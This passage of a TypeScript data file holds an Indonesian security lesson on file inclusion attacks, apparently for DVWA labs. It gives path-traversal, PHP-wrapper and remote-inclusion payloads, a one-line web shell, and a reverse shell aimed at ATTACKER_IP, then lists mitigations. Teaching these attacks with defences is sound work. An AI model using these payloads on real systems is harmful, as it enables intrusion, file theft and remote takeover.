            aksi: 'Di DVWA Medium + High, ada filter. Coba bypass:\n- `../` di-encode jadi `....//` atau `..%2f`\n- `../` di-double: `....//`\n- Pakai absolute path: `?page=/etc/passwd` (bukan../)\n- Null byte (PHP<5.3.4): `?page=../../../etc/passwd%00`\n\nDVWA High biasanya pakai whitelist — file non-dibenarkan akan ditolak. Diskusi: ini defensive approach.',
          },
        ],
        outputAkhir: 'Berhasil membaca file sistem sensitif via LFI. Bug confirmed.',
        kesalahanUmum: [
          {
            masalah: '❌ Muncul error "failed to open stream"',
            solusi: 'Jumlah `../` mungkin tidak cukup. Coba lebih banyak (10-15 levels) atau gunakan absolute path `/etc/passwd`.',
          },
          {
            masalah: '❌ Halaman blank / tanpa output',
            solusi: 'Termasuk mungkin berisi PHP dan dieksekusi (bukan ditampilkan). Coba file non-PHP seperti `/etc/passwd` atau `/etc/hostname`.',
          },
          {
            masalah: '❌ Tidak bisa traverse sama sekali',
            solusi: 'Server sudah filter. Coba encoding: `%2e%2e%2f` untuk `../`. Atau pakai PHP wrapper: `php://filter/convert.base64-encode/resource=/etc/passwd` (lihat Metode 2).',
          },
        ],
      },
      {
        nama: 'Metode 2: PHP Wrappers untuk Bypass Filter (Menengah)',
        level: 'menengah',
        deskripsi: 'Saat server filter `../` dan path traversal, pakai PHP wrappers khusus untuk bypass filter dan bahkan encode output.',
        prasyarat: [
          'DVWA / target',
          'Paham URL encoding',
        ],
        langkah: [
          {
            judul: 'Gunakan php://filter untuk baca file source',
            aksi: 'Kalian coba URL: `?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php`. Magic ini bekerja dengan PHP filter — base64-encode file sebelum include → server tidak mendeteksi itu sebagai kode PHP → output adalah base64 string yang bisa kamu decode untuk baca source code.',
            command: 'http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/index.php',
            expected: 'String panjang base64. Copy, decode pakai `echo BASE64 | base64 -d`.',
          },
          {
            judul: 'Gunakan php://input untuk eksekusi kode (PHP wrapper)',
            aksi: 'Beberapa PHP setups mengijinkan `php://input`. Ini membaca dari POST body. Bikin request dengan Burp atau curl:\n\n```bash\ncurl -X POST "http://localhost/vulnerabilities/fi/?page=php://input" --data "<?php system(\'id\'); ?>" -b "PHPSESSID=YOUR_COOKIE"\n```\n\nServer terima stream input → eval sebagai PHP → execute command.',
            command: 'curl -X POST "http://localhost/vulnerabilities/fi/?page=php://input" --data "<?php system(\'id\'); ?>"',
            expected: 'Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)',
          },
          {
            judul: 'Gunakan data: URI atau expect: wrapper',
            aksi: 'Wrapper lain: `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` (base64 dari `<?php system(\'id\'); ?>`). Atau `expect://id` di PHP yang punya ekstensi expect. Coba satu per satu.',
            command: 'http://localhost/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==',
            expected: 'Output executing command.',
            catatan: 'Wrapper `data://` dan `expect://` butuh `allow_url_include=On` di php.ini. Default banyak yang Off.',
          },
        ],
        outputAkhir: 'Berhasil bypass filter LFI dengan PHP wrappers. Source code terbaca sebagai base64. Eksekusi kode mungkin juga memungkinkan.',
        kesalahanUmum: [
          {
            masalah: '❌ Wrapper tidak jalan (allow_url_include=Off)',
            solusi: 'Normal di server modern. Coba wrapper `php://filter` yang biasanya tetap jalan.',
          },
          {
            masalah: '❌ Base64 output tidak bisa di-decode',
            solusi: 'Pastikan output base64 valid (tidak terpotong). Decode manual: simpan ke file lalu `base64 -d file.txt`.',
          },
        ],
      },
      {
        nama: 'Metode 3: RFI - Tarik Shellcode dari Server Luar (Lanjut)',
        level: 'lanjut',
        deskripsi: 'RFI jauh lebih berbahaya dari LFI — attacker bisa mendapatkan RCE penuh. Butuh server hosting sendiri untuk serve file PHP serangan.',
        prasyarat: [
          'Server lab dengan PHP that allows `include()` remote',
          'VPS / droplet lab sendiri (bukan server produksi)',
          'Target yang allow_url_include=On',
        ],
        langkah: [
          {
            judul: 'Setup server hosting sederhana',
            aksi: 'Kalian butuh server yang bisa serve file PHP. Bisa pakai VPS murah (DigitalOcean $4/bulan) atau server local sendiri. Setup: install PHP + Apache/Nginx. Buat file `evil.txt` (BUKAN .php, lihat Metode di bawah) berisi:\n\n```php\n<?php system($_GET["c"]); ?>\n```\n\nKenapa .txt? Karena target mungkin filter ekstensi .php di include.',
          },
          {
            judul: 'Suntikan URL RFI ke target',
            aksi: 'Sekarang suntikan URL server kamu: `?page=http://YOUR-SERVER-IP/evil.txt`. Pastikan `allow_url_include=On` di server target — kalau Off, RFI blocked.\n\nTarget akan: download evil.txt → eval sebagai PHP → eksekusi sesuai apapun yang diminta lewat parameter `c`.',
            command: 'http://target.com/lfi.php?page=http://YOUR-SERVER/evil.txt&c=id',
            expected: 'Output id command (uid=...).',
          },
          {
            judul: 'Reverse shell dari RFI',
            aksi: 'Setup listener nc di attacker PC: `nc -lvnp 4444`. Ganti konten evil.txt dengan reverse shell payload: `<?php system(\'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'); ?>`. Akses URL RFI, dan kamu akan dapat shell interaktif di terminal nc.',
            command: 'nc -lvnp 4444\nhttp://target.com/lfi.php?page=http://YOUR-SERVER/evil.txt',
            expected: 'Shell prompt muncul di terminal nc.',
          },
        ],
        outputAkhir: 'Berhasil RFI — file dari server luar di-download & dieksekusi target. RCE penuh.',
        kesalahanUmum: [
          {
            masalah: '❌ RFI diblokir (allow_url_include=Off)',
            solusi: 'Pakai LFI + RCE chain: log poisoning (inject PHP ke log, include via LFI), atau session file injection.',
          },
          {
            masalah: '❌ PHP dieksekusi sebagai teks (tidak jalan)',
            solusi: 'Pastikan ekstensi file tidak di-block target. Coba `.txt`, `.jpg`, tanpa ekstensi, atau path yang menambah ekstensi sendiri.',
          },
        ],
      },
    ],
    mitigasi: 'Pertahanan dari LFI/RFI:\n\n**1. Disable allow_url_include**: di php.ini set `allow_url_include = Off`. Set `allow_url_fopen = Off` juga (untuk file_get_contents remote).\n\n**2. Whitelist file inclusion**: daripada string concatenation, gunakan switch-case dengan whitelist file yang valid:\n```php\n$allowed = ["home", "about", "contact"];\nif (in_array($_GET["page"], $allowed)) { include("pages/" . $_GET["page"] . ".php"); }\nelse { die("Invalid page"); }\n```\n\n**3. Input Validation**: filter karakter `../`, `/`, `\\\', null byte. Atau basename(): `basename($page)` untuk ambil nama file saja.\n\n**4. open_basedir restriction**: set `open_basedir` di php.ini untuk batasi akses PHP hanya ke folder tertentu.\n\n**5. Chroot / Docker**: jalankan aplikasi di chroot atau container agar attacker cuma bisa akses file di dalam.\n\n**6. Disable dangerous functions**: `disable_functions = exec, system, passthru, shell_exec, eval` di php.ini. Cuma tidak akan阻止 LFI membaca file, tapi block RCE.',
    latihan: [
      '🔰 Tes DVWA File Inclusion di 3 level security (Low, Medium, High). Apa perbedaan filter?\n🔰 Pelajari php://filter. Decrypt `include.php` di DVWA untuk lihat source code.\n🟡 Pelajari log poisoning: inject PHP ke User-Agent Apache log, lalu include via LFI.\n🟡 Pelajari session file inclusion: set session custom value berisi PHP, lalu include session file dari /var/lib/php/sessions/.\n🔴 Pelajari race condition + LFI: bagaimana attacker bisa rapidly include file yang berubah?',
    ],
    faq: [
      { q: 'Apa beda LFI dan RFI?', a: 'LFI: include file dari server lokal (read only). RFI: include file dari URL luar — biasanya file PHP yang langsung dieksekusi (RCE).' },
      { q: 'Apakah LFI hanya di PHP?', a: 'Tidak. ASP.NET juga bisa (script tag injection), Java juga (Log4Shell via JNDI). Tapi PHP paling klasik karena include() function.' },
      { q: 'Apakah filter `../` cukup untuk block LFI?', a: 'Tidak. Banyak bypass: double encoding `%252e%252e%252f`, absolute path `/etc/passwd`, PHP wrappers, Unicode normalization. Whitelist selalu lebih aman.' },
      { q: 'Bagaimana cara cek apakah website punya LFI?', a: 'Cari parameter page/file/include/template dalam URL. Coba ganti dengan `../../../../../etc/passwd`. Kalau konten file muncul = LFI.' },
    ],
    ringkasan: [
      'LFI = include file lokal via path traversal (../)\nRFI = include file remote → RCE penuh',
      'Syarat: aplikasi pakai include() / require() dengan input user',
      'Tanda rentan: `?page=file` terlihat di URL → coba ganti dengan `?page=../../etc/passwd`',
      'Bypass filter: PHP wrappers (php://filter, php://input, data://), double encoding, null byte',
      'Tool identifikasi: Burp Suite + manual URL editing',
      'Pertahanan utama: allow_url_include=Off + whitelist + open_basedir + chroot',
    ],
    materiRelated: ['RCE', 'Secure Coding', 'WAF Setup', 'WAF (ModSecurity)'],
  } as MateriData,
];

export default seranganWeb2;
